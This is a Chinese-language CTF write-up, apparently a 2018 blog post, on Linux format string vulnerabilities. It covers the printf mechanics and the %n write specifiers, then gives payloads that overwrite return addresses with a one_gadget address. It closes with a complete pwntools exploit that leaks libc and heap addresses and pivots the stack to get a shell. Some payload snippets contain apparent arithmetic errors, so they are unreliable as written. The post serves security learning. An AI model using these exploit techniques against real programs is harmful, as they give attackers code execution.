---
title: linux格式化字符串漏洞
tags: ctf
abbrlink: 54897
date: 2018-06-08 17:55:43
---

# 格式化漏洞

参考链接：http://roo0.me/2017/11/05/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/#x86-64-%E4%B8%AD%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E

## 前置知识

### 原理

在 x86 结构下，格式字符串的参数是通过栈传递的，根据 cdecl 的调用约定，在进入 `printf()` 函数之前，将参数从右到左依次压栈。进入 `printf()` 之后，函数首先获取第一个参数，一次读取一个字符：如果字符不是 `%`，字符直接复制到输出中；否则，读取下一个非空字符，获取相应的参数并解析输出。

但在`printf()`函数对第一个参数进行解析的时候，它不会检查所传进来的参数个数，每当解析到`%...`的时候，它就会直接按照顺序在栈中向后取参数。所以如果第一个参数中的占位符`%...`数量多于后面所传进来的参数的话，就可以非法地访问到栈中其他地址的内容。

### 格式化字符串

- %d 用于读取10进制数值
- %x 用于读取16进制数值
- %s 用于读取字符串值
- %c 用于读取字符
- %p 用于读取指针地址
- %n 用于讲当前字符串的长度打印到var中，例 printf（"test %hn",&var[其中var为两个字节]） printf（"test %n",&var[其中var为一个字节]）%n 写4个字节，%hn写2个字节，%hhn写1个字节

### 案例

```
printf("Hello %%");           // "Hello %"
printf("Hello World!");       // "Hello World!"
printf("Number: %d", 123);    // "Number: 123"
printf("%s %s", "Format", "Strings");   // "Format Strings"
printf("%12c", 'A');          // "           A"
printf("%16s", "Hello");      // "          Hello!"
int n;
printf("%12c%n", 'A', &n);    // n = 12
printf("%16s%n", "Hello!", &n); // n = 16
printf("%2$s %1$s", "Format", "Strings"); // "Strings Format"
printf("%42c%1$n", &n);       // 首先输出41个空格，然后输出 n 的低八位地址作为一个字符
```

### X86_64中的格式化字符串漏洞

在 x64 体系中，多数调用惯例都是通过寄存器传递参数。在 Linux 上，前六个参数通过 `RDI`、`RSI`、`RDX`、`RCX`、`R8`和 `R9` 传递；而在 Windows 中，前四个参数通过 `RCX`、`RDX`、`R8`和 `R9` 来传递。

通常情况下，前五个数字却分别来自寄存器 `RSI`、`RDX`、`RCX`、`R8` 和 `R9`，后面的数字取自栈，我们知道共有6个寄存器用于传递参数，但是只输出5个，这是因为，`RDI`被用于传递格式化字符串。

## 漏洞利用方法

1. 大于4的时候:

```
1. 前缀
将返回地址修改为one_gadget
payload = p32(libc_start) + "%" + str(one_gadget & 0xff - 4) + "x%7$hhn"

payload = p32(libc_start + 1) + "%" + str(((one_gadget & 0xff00) >> 8)- 4) + "x    %7$hhn"

payload = p32(libc_start + 2) + "%" + str(((one_gadget & 0xff0000) >> 16)- 4) +     "x%7$hhn"
```

2. 小于4的时候

```
"AA%15$nA"+"\x38\xd5\xff\xff"
```

开头的 `AA` 占两个字节，即将地址`\x38\xd5\xff\xff赋值为 `2，

```
2. 后缀 可以写入
pad = str(one_gadget & 0xff)
if len(pad) == 3:
    payload = "%" + pad + "x%10$hhn" + p32(libc_start)
elif len(pad) == 2:
    payload = "%" + pad + "x%10$hhnA" + p32(libc_start)
else:
    payload = "%" + pad + "x%10$hhnAA" + p32(libc_start)

pad = str((one_gadget & 0xff) >> 8)
if len(pad) == 3:
    payload = "%" + pad + "x%10$hhn" + p32(libc_start + 1)
elif len(pad) == 2:
    payload = "%" + pad + "x%10$hhnA" + p32(libc_start + 1)
else:
    payload = "%" + pad + "x%10$hhnAA" + p32(libc_start + 1)
    
pad = str（(one_gadget & 0xff) >> 16)
if len(pad) == 3:
    payload = "%" + pad + "x%10$hhn" + p32(libc_start + 2)
elif len(pad) == 2:
    payload = "%" + pad + "x%10$hhnA" + p32(libc_start + 2)
else:
    payload = "%" + pad + "x%10$hhnAA" + p32(libc_start + 2)
```

## 无binary

## 格式化字符串不在栈上

CASW2015:

首先通过格式化字符串漏洞leak出libc和heap的地址。

main

​	-> display

​		-> display_1

​		     printf(format)

display_1_ebp --> display_ebp --> main_ebp

在display_1函数中，可以修改main中ebp的值。

display函数返回时，将执行如下语句:

```
pop ebp;
这里的 ebp = main_ebp;
而此时main_ebp是我们伪造的ebp。
```

这样当main函数运行到 leave,ret的时候

```
esp=ebp
pop ebp
pop rip
jump rip
```

这样的话，esp将指向我们伪造的ebp,实现堆栈转换。

rip将指向我们预先放置在堆中的one_gadget地址。

```
from pwn import *

p = process("./contacts")
context.log_level = "debug"

def create_contact(name, phone_number, length, description):
    p.recvuntil(">>>")
    p.sendline("1")
    p.recvuntil("Name: ")
    p.sendline(name)
    p.recvuntil("No: ")
    p.sendline(phone_number)
    p.recvuntil("Length of description: ")
    p.sendline(str(length))
    p.recvuntil("Enter description:")
    p.sendline(description)

def remove_contact(index):
    p.recvuntil(">>>")
    p.sendline("2")

def show_contact():
    p.recvuntil(">>>")
    p.sendline("4")

# leak libc, heap, %6$p => main_ebp
create_contact("c1", "123", "120", "%2$p.%11$p")

show_contact()
p.recvlines(4)
data = p.recvline()

libc = int(data[14:24], 16) - 0x5fcab
print hex(libc)
heap = int(data[25:35], 16) + 0x90 - 4
print heap

one_gadget = libc + 0x5fbc5

attach(p, "b *0x8048c27")
create_contact("c2", "123", "120", p32(one_gadget))

# 伪造main_ebp
create_contact("c3", "123", "120", "%" + str(heap) + "x%6$n")
show_contact()
p.recvuntil(">>>")
p.sendline("5")
p.interactive()
```





